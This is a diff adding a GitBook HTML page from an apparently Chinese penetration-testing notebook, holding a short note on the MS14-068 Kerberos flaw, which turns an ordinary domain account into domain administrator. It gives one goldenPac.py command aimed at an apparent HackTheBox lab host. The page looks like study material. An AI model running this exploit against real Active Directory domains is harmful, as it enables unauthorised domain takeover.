@@ -1,0 +1,877 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>MS14-068 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../CVE-2019-1040-NTLM-MIC绕过漏洞/" />
+    
+    
+    <link rel="prev" href="../DCSync/" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../nmap/">
+            
+                <a href="../../nmap/">
+            
+                    
+                    nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../searchsploit/">
+            
+                <a href="../../searchsploit/">
+            
+                    
+                    searchsploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../Metasploit/">
+            
+                <a href="../../Metasploit/">
+            
+                    
+                    Metasploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../内网穿透/">
+            
+                <a href="../../内网穿透/">
+            
+                    
+                    内网穿透
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../内网穿透/Frp/">
+            
+                <a href="../../内网穿透/Frp/">
+            
+                    
+                    Frp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../内网穿透/NPS/">
+            
+                <a href="../../内网穿透/NPS/">
+            
+                    
+                    NPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../SMTP/">
+            
+                <a href="../../SMTP/">
+            
+                    
+                    SMTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../SMB/">
+            
+                <a href="../../SMB/">
+            
+                    
+                    SMB
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../SMB/smbmap.html">
+            
+                <a href="../../SMB/smbmap.html">
+            
+                    
+                    smbmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../../SMB/smbclient.html">
+            
+                <a href="../../SMB/smbclient.html">
+            
+                    
+                    smbclient
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../../SMB/crackmapexec.html">
+            
+                <a href="../../SMB/crackmapexec.html">
+            
+                    
+                    crackmapexec
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../../FTP/">
+            
+                <a href="../../FTP/">
+            
+                    
+                    FTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="../../DNS/">
+            
+                <a href="../../DNS/">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="../../RPC/">
+            
+                <a href="../../RPC/">
+            
+                    
+                    RPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="../../LDAP/">
+            
+                <a href="../../LDAP/">
+            
+                    
+                    LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="../../WEB/">
+            
+                <a href="../../WEB/">
+            
+                    
+                    WEB
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../../WEB/扫描.html">
+            
+                <a href="../../WEB/扫描.html">
+            
+                    
+                    扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12.2" data-path="../../WEB/IIS.html">
+            
+                <a href="../../WEB/IIS.html">
+            
+                    
+                    IIS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12.3" data-path="../../WEB/tomcat.html">
+            
+                <a href="../../WEB/tomcat.html">
+            
+                    
+                    tomcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" data-path="../../数据库/">
+            
+                <a href="../../数据库/">
+            
+                    
+                    数据库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../../数据库/oracle.html">
+            
+                <a href="../../数据库/oracle.html">
+            
+                    
+                    oracle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../../数据库/mssql.html">
+            
+                <a href="../../数据库/mssql.html">
+            
+                    
+                    mssql
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    域渗透
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../命令.html">
+            
+                <a href="../命令.html">
+            
+                    
+                    命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.2" data-path="../提权/">
+            
+                <a href="../提权/">
+            
+                    
+                    提权
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.2.1" data-path="../提权/提权信息.html">
+            
+                <a href="../提权/提权信息.html">
+            
+                    
+                    提权信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.2.2" data-path="../提权/组提权.html">
+            
+                <a href="../提权/组提权.html">
+            
+                    
+                    组提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.3" data-path="../免杀/">
+            
+                <a href="../免杀/">
+            
+                    
+                    免杀
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.4" data-path="../密码和hash/">
+            
+                <a href="../密码和hash/">
+            
+                    
+                    密码和hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.5" data-path="../ACL滥用/">
+            
+                <a href="../ACL滥用/">
+            
+                    
+                    ACL滥用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.6" data-path="../组策略/">
+            
+                <a href="../组策略/">
+            
+                    
+                    组策略
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.7" data-path="../NTLM/">
+            
+                <a href="../NTLM/">
+            
+                    
+                    NTLM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.8" data-path="../Kerberos/">
+            
+                <a href="../Kerberos/">
+            
+                    
+                    Kerberos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.9" data-path="../LDAP/">
+            
+                <a href="../LDAP/">
+            
+                    
+                    LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.10" data-path="../DCSync/">
+            
+                <a href="../DCSync/">
+            
+                    
+                    DCSync
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.14.11" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    MS14-068
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.12" data-path="../CVE-2019-1040-NTLM-MIC绕过漏洞/">
+            
+                <a href="../CVE-2019-1040-NTLM-MIC绕过漏洞/">
+            
+                    
+                    CVE-2019-1040-NTLM-MIC绕过漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.13" data-path="../PASS-THE-HASH/">
+            
+                <a href="../PASS-THE-HASH/">
+            
+                    
+                    Pass The Hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.14" data-path="../CVE-2020-1472 NetLogon权限提升漏洞/">
+            
+                <a href="../CVE-2020-1472 NetLogon权限提升漏洞/">
+            
+                    
+                    CVE-2020-1472 NetLogon权限提升漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.15" data-path="../Windows-Print-Spooler权限提升漏洞/">
+            
+                <a href="../Windows-Print-Spooler权限提升漏洞/">
+            
+                    
+                    Windows Print Spooler权限提升漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.16" data-path="../ADCS攻击/">
+            
+                <a href="../ADCS攻击/">
+            
+                    
+                    ADCS攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.17" data-path="../票据攻击/">
+            
+                <a href="../票据攻击/">
+            
+                    
+                    票据攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.18" data-path="../域渗透工具/">
+            
+                <a href="../域渗透工具/">
+            
+                    
+                    域渗透工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" data-path="../../Linux/">
+            
+                <a href="../../Linux/">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../../Linux/反弹shell/">
+            
+                <a href="../../Linux/反弹shell/">
+            
+                    
+                    反弹shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15.2" data-path="../../Linux/提权/">
+            
+                <a href="../../Linux/提权/">
+            
+                    
+                    提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >MS14-068</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="ms14-068">MS14-068</h1>
+<p>&#x62E5;&#x6709;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x57DF;&#x8D26;&#x53F7;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x63D0;&#x6743;&#x6210;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x65E0;&#x9700;&#x77E5;&#x9053;krbtgt&#x7684;Hash&#xFF0C;&#x7C7B;&#x4F3C;&#x9EC4;&#x91D1;&#x7968;&#x636E;&#x3002;</p>
+<pre><code class="lang-shell">python3.10 goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../DCSync/" class="navigation navigation-prev " aria-label="Previous page: DCSync">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../CVE-2019-1040-NTLM-MIC绕过漏洞/" class="navigation navigation-next " aria-label="Next page: CVE-2019-1040-NTLM-MIC绕过漏洞">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"MS14-068","level":"1.14.11","depth":2,"next":{"title":"CVE-2019-1040-NTLM-MIC绕过漏洞","level":"1.14.12","depth":2,"path":"域渗透/CVE-2019-1040-NTLM-MIC绕过漏洞/README.md","ref":"./域渗透/CVE-2019-1040-NTLM-MIC绕过漏洞/README.md","articles":[]},"previous":{"title":"DCSync","level":"1.14.10","depth":2,"path":"域渗透/DCSync/README.md","ref":"./域渗透/DCSync/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"域渗透/MS14-068/README.md","mtime":"2023-09-24T07:03:56.250Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-24T07:12:45.149Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
